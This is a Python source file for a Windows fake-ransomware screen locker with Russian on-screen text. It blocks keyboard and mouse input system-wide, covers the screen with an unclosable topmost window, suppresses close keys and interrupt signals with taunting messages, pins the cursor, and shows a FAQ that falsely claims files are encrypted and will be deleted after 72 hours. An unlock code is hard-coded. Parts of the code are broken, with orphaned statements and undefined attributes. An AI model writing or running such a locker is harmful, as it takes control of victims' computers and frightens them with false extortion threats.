import tkinter as tk
from tkinter import messagebox
import sys
import os
import ctypes
import threading
import time
import subprocess
import pyttsx3
import signal
engine = pyttsx3.init()
engine.setProperty("rate", 150)
engine.setProperty("volume", 0.9)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
print("подождите...")


kernel32.SetConsoleCtrlHandler(None, True)
def setup_signal_handlers():
            signal.signal(signal.SIGINT, signal_handler)
            signal.signal(signal.SIGTERM, signal_handler)

            signal.signal(signal.SIGABRT, signal_handler)
            if hasattr(signal, "SIGBREAK"):
                signal.signal(signal.SIGBREAK, signal_handler)
            
def signal_handler(signum, frame):
                messagebox.showwarning("АХАХХАХАХ", "ты думал тебе поможет жалкий сигнал {signum}, глупенький?")
            
# Блокируем ввод на системном уровне
try:
    ctypes.windll.user32.BlockInput(True)
except:
    pass

# Проверяем доступность win32api для блокировки мыши
try:
    import win32api
    import win32con
    WIN32_AVAILABLE = True
except:
    WIN32_AVAILABLE = False
engine.say("Your Computer Was blocked!")
engine.runAndWait()

class UnclosableApp:
    def __init__(self):
        self.running = True
        self.root = tk.Tk()
        self.root.title("Ваш компьютер был заблокирован")
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        self.root.overrideredirect(True)
        setup_signal_handlers()


       
    



        

        
        # Делаем окно поверх всех окон
        self.root.attributes('-topmost', True)
        
        # Блокируем все способы закрытия
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
        self.root.bind("<Alt-F4>", self.prevent_close)
        self.root.bind("<Control-Alt-Delete>", self.intercept_ctrl_alt_del)
        self.root.bind("<Control-Shift-Escape>", self.intercept_ctrl_shift_esc)
        self.root.bind("<Escape>", self.prevent_close)
        self.root.bind("<Key>", self.handle_key_press)
        
        # Блокируем системные клавиши
        system_keys = ['<Control_L>', '<Control_R>', '<Alt_L>', '<Alt_R>', 
                      '<Win_L>', '<Win_R>', '<Shift_L>', '<Shift_R>']
        for key in system_keys:
            self.root.bind(key, self.intercept_system_keys)
        
        # Биндим комбинацию для секретного ввода
        self.root.bind('<Control-Shift-Alt-q>', self.activate_secret_input)
        self.root.bind('<Control-Shift-Alt-Q>', self.activate_secret_input)
        
        # Секретный код
        self.secret_code = "h3x9wjaqQkd;w3*@9e2q"
        self.entered_code = ""
        
        # Основной текст
        self.label = tk.Label(
            self.root, 
            text="ЗАБЛОКИРОВАНО!", 
            font=("Arial", 72, "bold"), 
            fg="red", 
            bg="black"
        )
        self.label.pack(expand=True)
        
        # Сообщение о разблокировке (красный текст между заголовком и полем ввода)
        self.unlock_label = tk.Label(
            self.root,
            text=" нажмите ctrl+shift+alt+q для разблокировки. Для дополнительной информации нажмите FAQ.",
            font=("Arial", 12),
            fg="red",
            bg="black"
        )
        self.unlock_label.pack(pady=10)
        
        # Переменные для секретного ввода
        self.secret_input_active = False
        self.secret_input = ""
        self.real_secret_code = "38352*(#&002jsiQE27"
        
    
        
        # Дополнительный текст снизу (пользователь может изменить)
        self.bottom_label = tk.Label(
            self.root,
            text="Введите секретный код для разблокировки вашего устройства.",
            font=("Arial", 16),
            fg="red",
            bg="black"
        )
        self.bottom_label.pack(side='bottom', pady=50)
        
        # Кнопка для открытия FAQ
        self.faq_button = tk.Button(
            self.root,
            text="FAQ",
            font=("Arial", 16),
            command=self.open_faq
        )
        self.faq_button.pack(side='bottom', pady=10)
        
        # Запускаем защитные механизмы
        self.start_protection_threads() #
        
        # Запускаем блокировку мыши
        threading.Thread(target=self.block_mouse_movement, daemon=True).start()
        
        # Запускаем таймер
        threading.Thread(target=self.timer_thread, daemon=True).start()
        
    def start_protection_threads(self):
        # Поток для поддержания фокуса
        threading.Thread(target=self.keep_focus, daemon=True).start()
        
    
        
        
    def keep_focus(self):
        while True:
            try:
                self.root.focus_force()
                time.sleep(0.1)
            except:
                pass
        
   

    
        
    
    def block_mouse_movement(self):
        """Блокируем движение мыши - ограничиваем в маленькой области"""
        while True:
            try:
                if WIN32_AVAILABLE:
                    # Получаем текущую позицию мыши
                    x, y = win32api.GetCursorPos()
                    
                    # Ограничиваем движение в небольшой области (50x50 пикселей)
                    max_x = min(x + 25, win32api.GetSystemMetrics(0))
                    min_x = max(x - 25, 0)
                    max_y = min(y + 25, win32api.GetSystemMetrics(1)) 
                    min_y = max(y - 25, 0)
                    
                    # Если мышь вышла за пределы - возвращаем обратно
                    if x < min_x or x > max_x or y < min_y or y > max_y:
                        center_x = (min_x + max_x) // 2
                        center_y = (min_y + max_y) // 2
                        win32api.SetCursorPos((center_x, center_y))
                    
                    time.sleep(0.1)
                else:
                    # Простой метод - двигаем к центру экрана
                    screen_width = self.root.winfo_screenwidth()
                    screen_height = self.root.winfo_screenheight()
                    center_x = screen_width // 2
                    center_y = screen_height // 2
                    
                    # Используем tkinter для перемещения мыши
                    self.root.event_generate('<Motion>', warp=True, x=center_x, y=center_y)
                    time.sleep(2)
            except:
                time.sleep(1)
        
    def prevent_close(self, event=None):
        return "break"
        
    def intercept_ctrl_alt_del(self, event):
        return "break"
        
    def intercept_ctrl_shift_esc(self, event):
        return "break"
        
    def intercept_system_keys(self, event):
        return "break"
        
    def activate_secret_input(self, event=None):
        """Активируем секретный ввод"""
        if not self.secret_input_active:
            self.secret_input_active = True
            self.secret_input = ""
            
            # Создаем поле для секретного ввода (сбоку)
            self.secret_input_label = tk.Label(
                self.root,
                text="Секретный код: ",
                font=("Arial", 16),
                fg="red",
                bg="black"
            )
            self.secret_input_label.place(x=50, y=200)
            
            self.secret_display = tk.Label(
                self.root,
                text="",
                font=("Arial", 16, "bold"),
                fg="green",
                bg="black"
            )
            self.secret_display.place(x=200, y=200)
            
            # Меняем обработчик клавиш для секретного ввода
            self.root.unbind("<Key>")
            self.root.bind("<Key>", self.handle_secret_input)
            
        return "break"
    
    def handle_secret_input(self, event):
        """Обработка ввода секретного кода"""
        if event.char:
            self.secret_input += event.char
            self.secret_display.config(text="*" * len(self.secret_input))
            
            # Проверяем код
            if self.secret_input == self.real_secret_code:
                self.real_unlock()
            elif len(self.secret_input) >= len(self.real_secret_code):
                # Сбрасываем если слишком длинный
                self.secret_input = ""
                self.secret_display.config(text="")
                
        elif event.keysym == 'BackSpace':
            self.secret_input = self.secret_input[:-1]
            self.secret_display.config(text="*" * len(self.secret_input))
            
        return "break"
    
    def real_unlock(self):
        """Настоящая разблокировка системы"""
        try:
            # Разблокируем ввод
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        
        # Создаем окно восстановления системы
        restore_window = tk.Toplevel(self.root)
        restore_window.attributes('-fullscreen', True)
        restore_window.configure(bg='black')
        restore_window.attributes('-topmost', True)
        
        # Текст восстановления
        restore_label = tk.Label(
            restore_window,
            text="Восстановление системы...",
            font=("Arial", 36, "bold"),
            fg="white",
            bg="black"
        )
        restore_label.pack(pady=100)
        
        # Простой текст вместо прогресс бара
        status_label = tk.Label(
            restore_window,
            text="Разблокировка завершена!",
            font=("Arial", 24),
            fg="white",
            bg="black"
        )
        status_label.pack(pady=20)
        
        # Немедленная разблокировка
        def unlock():
            time.sleep(2)  # Небольшая задержка для визуального эффекта
            restore_window.destroy()
            self.root.destroy()
            messagebox.showinfo("Разблокировано", "Компьютер разблокирован!")
            sys.exit(0)
        
        threading.Thread(target=unlock, daemon=True).start()
    
    def handle_key_press(self, event):
        # Клавиши для краша
        if event.char and event.char.lower() in ['q', 'й']:
            
            return "break"
            
        # Ввод букв и цифр для кода
        if event.char and (event.char.isalnum() or event.char in ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')']):
            self.entered_code += event.char
            self.update_code_display()
            
            if len(self.entered_code) == len(self.secret_code):
                if self.entered_code == self.secret_code:
                    messagebox.showinfo("АХАХАХААХАХАХХ", "система разблокирована")
                    exit(1)
            
                else:
                    self.entered_code = ""
                    self.update_code_display()
                    messagebox.showerror("Ошибка", "Неверный код!ты никогда отсюда не выйдешь. никогда.сдесь нет секретного кода. только ctrl+alt+shift+q")
            return "break"
        
        # Очистка кода
        elif event.keysym == 'BackSpace':
            self.entered_code = self.entered_code[:-1]
            self.update_code_display()
            return "break"
            
        return "break"
            
    def update_code_display(self):
        self.code_label.config(text="Введите код: " + "*" * len(self.entered_code))
        
    def crash_app(self):
        # Принудительный краш(нет)
        messagebox.showerror("не-а")
        
    def safe_exit(self):
        # Безопасный выход
        try:
            hdddd = 87
        except:
            hddifunujcrheurneri = 8385638568
        finally:
            messagebox.showerror("HAHHAHHAHAHAH")
            exit()
            
    def run(self):
        try:
            self.root.mainloop()
        except:
            # Перезапуск при ошибках
            self.run()
            
    def timer_thread(self):
        # Ждем 72 часа (в секундах)
        time.sleep(72 * 60 * 60)
        # После 72 часов ничего не происходит
        pass
        
    def open_faq(self):
        """Открывает окно с часто задаваемыми вопросами"""
        faq_window = tk.Toplevel(self.root)
        faq_window.title("FAQ")
        faq_window.geometry("600x400")
        faq_window.configure(bg='black')
        faq_window.attributes('-topmost', True)
        
        # Заголовок
        title_label = tk.Label(
            faq_window,
            text="Часто Задаваемые Вопросы",
            font=("Arial", 24, "bold"),
            fg="white",
            bg="black"
        )
        title_label.pack(pady=20)
        
        # Вопросы и ответы
        faq_text = """
        В: Что произошло с моим компьютером?
        О: Ваш компьютер был заблокирован. 
        
        В: Как мне вернуть доступ к своим файлам?
        О: Для получения ключа для расшифровки, вы должны ввести секретный код
        
        В: Могу ли я сам расшифровать файлы без кода?
        О: Нет, вы не сможете расшифровать файлы без кода.
        
        В: Что произойдет, если я не введу секретный код?
        О: Если вы не введете секретный код в течение 72 часов, файлы будут удалены.

        В:как получить ключ?
        О:сам не знаю.
        """
        
        # Текст FAQ
        faq_label = tk.Label(
            faq_window,
            text=faq_text,
            font=("Arial", 12),
            fg="red",
            bg="black",
            justify="left"
        )
        faq_label.pack(pady=20)
        
        # Кнопка закрытия
        close_button = tk.Button(
            faq_window,
            text="Закрыть",
            font=("Arial", 16),
            command=faq_window.destroy
        )
        close_button.pack(pady=20)
 
# Создаем интерфейс
        self.create_widgets()
       
        # Блокируем мышь если доступно win32api
        if WIN32_AVAILABLE:
            self.block_mouse_thread = threading.Thread(target=self.block_mouse)
            self.block_mouse_thread.daemon = True
            self.block_mouse_thread.start()
       
        # Запускаем проверку процессов
        self.check_processes()
       
        # Запускаем Tkinter
        self.root.mainloop()
   
    def create_widgets(self):
        # Сообщение о блокировке
        message_label = tk.Label(
            self.root,
            text="ВАШ КОМПЬЮТЕР БЫЛ ЗАБЛОКИРОВАН!\n\nДля разблокировки введите код.для доп информации нажмите FAQ.",
            font=("Arial", 24, "bold"),
            fg="red",
            bg="black",
            justify=tk.CENTER
        )
        message_label.pack(expand=True)
       
        # Таймер (для видимости)
        self.timer_label = tk.Label(
            self.root,
            text="",
            font=("Arial", 18),
            fg="red",
            bg="black"
        )
        self.timer_label.pack(pady=20)
       
        # Обновляем таймер
        self.update_timer()
   
    def update_timer(self):
        if self.running:
            current_time = time.strftime("%H:%M:%S")
            self.timer_label.config(text=f"Время: {current_time}")
            self.root.after(1000, self.update_timer)
   
    def block_mouse(self):
        while self.running:
            try:
                # Блокируем мышь в центре экрана
                if WIN32_AVAILABLE:
                    win32api.SetCursorPos(
                        (self.root.winfo_screenwidth() // 2,
                         self.root.winfo_screenheight() // 2)
                    )
                time.sleep(0.1)
            except:
                pass
   
    def check_processes(self):
        print("bar")
    
       
               
           
       
   
    def on_closing(self):
        # Игнорируем попытки закрытия
        messagebox.showwarning("Ошибка", "Закрытие невозможно!")
   
    def destroy(self):
        self.running = False
        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        self.root.quit()

# Запуск приложения
if __name__ == "__main__":
    app = UnclosableApp()
    # Вешаем обработчик на попытку закрытия
    app.root.protocol("WM_DELETE_WINDOW", app.on_closing)
    app.root.mainloop()
    app.block_mouse()
    time.sleep(10)
    exit(0)